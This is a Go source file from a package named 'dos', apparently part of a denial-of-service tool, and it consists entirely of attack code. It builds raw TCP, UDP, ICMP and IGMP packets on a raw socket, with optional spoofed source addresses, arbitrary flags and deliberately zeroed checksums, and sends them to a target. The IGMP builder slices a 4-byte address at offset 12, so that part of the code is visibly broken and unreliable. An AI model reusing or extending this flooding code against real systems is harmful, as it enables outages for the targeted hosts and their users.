package dos

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"golang.org/x/net/ipv4"
)

var (
	rawConn     *ipv4.RawConn
	conn        net.PacketConn
	connCreated bool
	connMutex   sync.Mutex

	cachedLocalIP     net.IP
	cachedLocalIPOnce sync.Once
)

func getLocalIP() net.IP {
	cachedLocalIPOnce.Do(func() {
		interfaces, err := net.Interfaces()
		if err != nil {
			cachedLocalIP = net.ParseIP("192.168.1.100").To4()
			return
		}
		for _, iface := range interfaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP.To4()
				case *net.IPAddr:
					ip = v.IP.To4()
				}
				if ip != nil {
					cachedLocalIP = ip
					return
				}
			}
		}
		cachedLocalIP = net.ParseIP("192.168.1.100").To4()
	})
	return cachedLocalIP
}

var (
	packetPool          sync.Pool
	tcpTemplate         []byte
	udpTemplate         []byte
	icmpTemplate        []byte
	igmpTemplate        []byte
	templateMutex       sync.RWMutex
	templateValid       bool
	templatePayloadSize int
	templateProtocol    string
)

const (
	MaxPacketSize  = 1500
	IPHeaderSize   = 20
	TCPHeaderSize  = 20
	UDPHeaderSize  = 8
	ICMPHeaderSize = 8
	IGMPHeaderSize = 8
)

func initRawSocket() error {
	connMutex.Lock()
	defer connMutex.Unlock()

	if connCreated {
		return nil
	}

	var err error
	conn, err = net.ListenPacket("ip4:255", "0.0.0.0")
	if err != nil {
		return fmt.Errorf("create socket failed: %v", err)
	}

	rawConn, err = ipv4.NewRawConn(conn)
	if err != nil {
		conn.Close()
		return fmt.Errorf("create raw conn failed: %v", err)
	}

	connCreated = true
	return nil
}

func initPacketPool() {
	packetPool.New = func() interface{} {
		buf := make([]byte, MaxPacketSize)
		return &buf
	}
}

type PacketTemplate struct {
	Protocol    string
	PayloadSize int
	PacketData  []byte
	Lock        sync.RWMutex
}

var currentTemplate PacketTemplate

func init() {
	initPacketPool()
	rand.Seed(time.Now().UnixNano())
}

func closeRawSocket() {
	connMutex.Lock()
	defer connMutex.Unlock()

	if rawConn != nil {
		rawConn.Close()
		rawConn = nil
	}
	if conn != nil {
		conn.Close()
		conn = nil
	}
	connCreated = false
	templateValid = false
}

func buildTCPPacketFast(targetIP string, srcPort, destPort uint16, flags uint8, window uint16, ttl int, tos uint8, payloadSize int, bogusChecksum bool) ([]byte, error) {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return nil, fmt.Errorf("无效的目标IP地址: %s", targetIP)
	}

	dst := ip.To4()
	if dst == nil {
		return nil, fmt.Errorf("无效的IPv4地址: %s", targetIP)
	}

	src := getLocalIP()
	if src == nil {
		src = net.ParseIP("0.0.0.0").To4()
	}

	totalLen := 20 + 20 + payloadSize

	packet := make([]byte, totalLen)

	packet[0] = 0x45
	packet[1] = tos
	binary.BigEndian.PutUint16(packet[2:4], uint16(totalLen))
	packet[4] = 0
	packet[5] = 0
	packet[6] = 0x40
	packet[7] = 0
	packet[8] = byte(ttl)
	packet[9] = 6
	copy(packet[12:16], src)
	copy(packet[16:20], dst)

	if bogusChecksum {
		packet[10] = 0
		packet[11] = 0
	} else {
		checksum := calculateChecksum(packet[:20])
		packet[10] = byte(checksum >> 8)
		packet[11] = byte(checksum)
	}

	tcpOffset := 20
	binary.BigEndian.PutUint16(packet[tcpOffset:tcpOffset+2], srcPort)
	binary.BigEndian.PutUint16(packet[tcpOffset+2:tcpOffset+4], destPort)
	seq := rand.Uint32()
	binary.BigEndian.PutUint32(packet[tcpOffset+4:tcpOffset+8], seq)
	binary.BigEndian.PutUint32(packet[tcpOffset+8:tcpOffset+12], 0)
	packet[tcpOffset+12] = (5 << 4)
	packet[tcpOffset+13] = flags
	binary.BigEndian.PutUint16(packet[tcpOffset+14:tcpOffset+16], window)
	binary.BigEndian.PutUint16(packet[tcpOffset+16:tcpOffset+18], 0)
	binary.BigEndian.PutUint16(packet[tcpOffset+18:tcpOffset+20], 0)

	if bogusChecksum {
		binary.BigEndian.PutUint16(packet[tcpOffset+16:tcpOffset+18], 0)
	} else {
		checksum := calculateTCPChecksum(src, dst, packet[tcpOffset:totalLen])
		packet[tcpOffset+16] = byte(checksum >> 8)
		packet[tcpOffset+16+1] = byte(checksum)
	}

	return packet, nil
}

func buildUDPPacketFast(targetIP string, srcPort, destPort uint16, ttl int, payloadSize int, bogusChecksum bool) ([]byte, error) {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return nil, fmt.Errorf("无效的目标IP地址: %s", targetIP)
	}

	dst := ip.To4()
	if dst == nil {
		return nil, fmt.Errorf("无效的IPv4地址: %s", targetIP)
	}

	src := getLocalIP()
	if src == nil {
		src = net.ParseIP("0.0.0.0").To4()
	}

	udpLen := 8 + payloadSize
	totalLen := 20 + udpLen

	packet := make([]byte, totalLen)

	packet[0] = 0x45
	packet[1] = 0
	binary.BigEndian.PutUint16(packet[2:4], uint16(totalLen))
	packet[4] = 0
	packet[5] = 0
	packet[6] = 0x40
	packet[7] = 0
	packet[8] = byte(ttl)
	packet[9] = 17
	copy(packet[12:16], src)
	copy(packet[16:20], dst)

	if bogusChecksum {
		packet[10] = 0
		packet[11] = 0
	} else {
		checksum := calculateChecksum(packet[:20])
		packet[10] = byte(checksum >> 8)
		packet[11] = byte(checksum)
	}

	udpOffset := 20
	binary.BigEndian.PutUint16(packet[udpOffset:udpOffset+2], srcPort)
	binary.BigEndian.PutUint16(packet[udpOffset+2:udpOffset+4], destPort)
	binary.BigEndian.PutUint16(packet[udpOffset+4:udpOffset+6], uint16(udpLen))
	binary.BigEndian.PutUint16(packet[udpOffset+6:udpOffset+8], 0)

	return packet, nil
}

func buildICMPPacketFast(targetIP string, ttl int, payloadSize int) ([]byte, error) {
	ip := net.ParseIP(targetIP)
	if ip == nil {
		return nil, fmt.Errorf("无效的目标IP地址: %s", targetIP)
	}

	dst := ip.To4()
	if dst == nil {
		return nil, fmt.Errorf("无效的IPv4地址: %s", targetIP)
	}

	src := getLocalIP()
	if src == nil {
		src = net.ParseIP("0.0.0.0").To4()
	}

	icmpLen := 8 + payloadSize
	totalLen := 20 + icmpLen

	packet := make([]byte, totalLen)

	packet[0] = 0x45
	packet[1] = 0
	binary.BigEndian.PutUint16(packet[2:4], uint16(totalLen))
	packet[4] = 0
	packet[5] = 0
	packet[6] = 0x40
	packet[7] = 0
	packet[8] = byte(ttl)
	packet[9] = 1
	copy(packet[12:16], src)
	copy(packet[16:20], dst)

	checksum := calculateChecksum(packet[:20])
	packet[10] = byte(checksum >> 8)
	packet[11] = byte(checksum)

	icmpOffset := 20
	packet[icmpOffset] = 8
	packet[icmpOffset+1] = 0
	binary.BigEndian.PutUint16(packet[icmpOffset+2:icmpOffset+4], 0)
	binary.BigEndian.PutUint16(packet[icmpOffset+4:icmpOffset+6], 0)
	binary.BigEndian.PutUint16(packet[icmpOffset+6:icmpOffset+8], 0)

	return packet, nil
}

func buildTCPHeader(srcPort, dstPort uint16, flags uint8, window uint16) []byte {
	header := make([]byte, 20)
	binary.BigEndian.PutUint16(header[0:2], srcPort)
	binary.BigEndian.PutUint16(header[2:4], dstPort)
	binary.BigEndian.PutUint32(header[4:8], rand.Uint32())
	binary.BigEndian.PutUint32(header[8:12], 0)
	header[12] = (5 << 4)
	header[13] = flags
	binary.BigEndian.PutUint16(header[14:16], window)
	binary.BigEndian.PutUint16(header[16:18], 0)
	binary.BigEndian.PutUint16(header[18:20], 0)
	return header
}

func buildTCPPacket(srcIP, dstIP string, tcpHeader, payload []byte, ttl int, tos uint8, bogusChecksum bool) []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	if src == nil || src.To4() == nil {
		src = getLocalIP()
	}
	if dst == nil || dst.To4() == nil {
		return nil
	}

	totalLen := 20 + 20 + len(tcpHeader) - 20 + len(payload)
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45
	ipHeader[1] = tos
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLen))
	ipHeader[4] = 0
	ipHeader[5] = 0
	ipHeader[6] = 0x40
	ipHeader[7] = 0
	ipHeader[8] = byte(ttl)
	ipHeader[9] = 6
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	copy(ipHeader[12:16], src.To4())
	copy(ipHeader[16:20], dst.To4())

	if bogusChecksum {
		binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	} else {
		checksum := calculateChecksum(ipHeader)
		binary.BigEndian.PutUint16(ipHeader[10:12], checksum)
	}

	tcpWithPayload := append(tcpHeader, payload...)
	tcpChecksum := calculateTCPChecksum(src.To4(), dst.To4(), tcpWithPayload)
	if bogusChecksum {
		tcpWithPayload[16] = 0
		tcpWithPayload[17] = 0
	} else {
		binary.BigEndian.PutUint16(tcpWithPayload[16:18], tcpChecksum)
	}

	packet := append(ipHeader, tcpWithPayload...)
	return packet
}

func buildUDPPacket(srcIP, dstIP string, srcPort, dstPort uint16, payload []byte, ttl int, bogusChecksum bool) []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	if src == nil || src.To4() == nil {
		src = getLocalIP()
	}
	if dst == nil || dst.To4() == nil {
		return nil
	}

	udpLen := 8 + len(payload)
	totalLen := 20 + udpLen

	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45
	ipHeader[1] = 0
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLen))
	ipHeader[4] = 0
	ipHeader[5] = 0
	ipHeader[6] = 0x40
	ipHeader[7] = 0
	ipHeader[8] = byte(ttl)
	ipHeader[9] = 17
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	copy(ipHeader[12:16], src.To4())
	copy(ipHeader[16:20], dst.To4())

	if bogusChecksum {
		binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	} else {
		checksum := calculateChecksum(ipHeader)
		binary.BigEndian.PutUint16(ipHeader[10:12], checksum)
	}

	udpHeader := make([]byte, 8)
	binary.BigEndian.PutUint16(udpHeader[0:2], srcPort)
	binary.BigEndian.PutUint16(udpHeader[2:4], dstPort)
	binary.BigEndian.PutUint16(udpHeader[4:6], uint16(udpLen))
	binary.BigEndian.PutUint16(udpHeader[6:8], 0)

	udpWithPayload := append(udpHeader, payload...)
	udpChecksum := calculateUDPChecksum(src.To4(), dst.To4(), udpWithPayload)
	if bogusChecksum {
		udpWithPayload[6] = 0
		udpWithPayload[7] = 0
	} else {
		binary.BigEndian.PutUint16(udpWithPayload[6:8], udpChecksum)
	}

	packet := append(ipHeader, udpWithPayload...)
	return packet
}

func buildICMPPacket(srcIP, dstIP string, ttl int, payload []byte) []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	if src == nil || src.To4() == nil {
		src = getLocalIP()
	}
	if dst == nil || dst.To4() == nil {
		return nil
	}

	icmpLen := 8 + len(payload)
	totalLen := 20 + icmpLen

	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45
	ipHeader[1] = 0
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLen))
	ipHeader[4] = 0
	ipHeader[5] = 0
	ipHeader[6] = 0x40
	ipHeader[7] = 0
	ipHeader[8] = byte(ttl)
	ipHeader[9] = 1
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	copy(ipHeader[12:16], src.To4())
	copy(ipHeader[16:20], dst.To4())

	checksum := calculateChecksum(ipHeader)
	binary.BigEndian.PutUint16(ipHeader[10:12], checksum)

	icmpHeader := make([]byte, 8)
	icmpHeader[0] = 8
	icmpHeader[1] = 0
	binary.BigEndian.PutUint16(icmpHeader[2:4], 0)
	binary.BigEndian.PutUint16(icmpHeader[4:6], 0)
	binary.BigEndian.PutUint16(icmpHeader[6:8], 0)

	icmpWithPayload := append(icmpHeader, payload...)
	icmpChecksum := calculateChecksum(icmpWithPayload)
	binary.BigEndian.PutUint16(icmpWithPayload[2:4], icmpChecksum)

	packet := append(ipHeader, icmpWithPayload...)
	return packet
}

func buildIGMPPacket(srcIP, dstIP string, ttl int) []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	if src == nil || src.To4() == nil {
		src = getLocalIP()
	}
	if dst == nil || dst.To4() == nil {
		return nil
	}

	igmpLen := 8
	totalLen := 20 + igmpLen

	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45
	ipHeader[1] = 0
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLen))
	ipHeader[4] = 0
	ipHeader[5] = 0
	ipHeader[6] = 0x40
	ipHeader[7] = 0
	ipHeader[8] = byte(ttl)
	ipHeader[9] = 2
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	copy(ipHeader[12:16], src.To4())
	copy(ipHeader[16:20], dst.To4())

	checksum := calculateChecksum(ipHeader)
	binary.BigEndian.PutUint16(ipHeader[10:12], checksum)

	igmpHeader := make([]byte, 8)
	igmpHeader[0] = 0x11
	igmpHeader[1] = 0
	igmpHeader[2] = 0
	igmpHeader[3] = 0
	copy(igmpHeader[4:8], dst.To4()[12:16])

	igmpChecksum := calculateChecksum(igmpHeader)
	binary.BigEndian.PutUint16(igmpHeader[2:4], igmpChecksum)

	packet := append(ipHeader, igmpHeader...)
	return packet
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func calculateTCPChecksum(srcIP, dstIP, tcpData []byte) uint16 {
	psuedoHeader := make([]byte, 12)
	copy(psuedoHeader[0:4], srcIP)
	copy(psuedoHeader[4:8], dstIP)
	psuedoHeader[8] = 0
	psuedoHeader[9] = 6
	binary.BigEndian.PutUint16(psuedoHeader[10:12], uint16(len(tcpData)))

	data := append(psuedoHeader, tcpData...)
	return calculateChecksum(data)
}

func calculateUDPChecksum(srcIP, dstIP, udpData []byte) uint16 {
	psuedoHeader := make([]byte, 12)
	copy(psuedoHeader[0:4], srcIP)
	copy(psuedoHeader[4:8], dstIP)
	psuedoHeader[8] = 0
	psuedoHeader[9] = 17
	binary.BigEndian.PutUint16(psuedoHeader[10:12], uint16(len(udpData)))

	data := append(psuedoHeader, udpData...)
	return calculateChecksum(data)
}

func sendRawPacket(packet []byte, iface string) error {
	if len(packet) == 0 {
		return fmt.Errorf("empty packet")
	}

	if err := initRawSocket(); err != nil {
		return err
	}

	if len(packet) < 20 {
		return fmt.Errorf("packet too short")
	}

	dstIP := net.IP(packet[16:20])
	srcIP := net.IP(packet[12:16])
	protocol := packet[9]

	header := &ipv4.Header{
		Version:  4,
		Len:      20,
		TOS:      int(packet[1]),
		TotalLen: int(packet[2])<<8 | int(packet[3]),
		TTL:      int(packet[8]),
		Protocol: int(protocol),
		Dst:      dstIP,
		Src:      srcIP,
	}

	payload := packet[20:]
	err := rawConn.WriteTo(header, payload, nil)
	if err != nil {
		return fmt.Errorf("send packet failed: %v", err)
	}

	return nil
}

func init() {
	rand.Seed(time.Now().UnixNano())
}
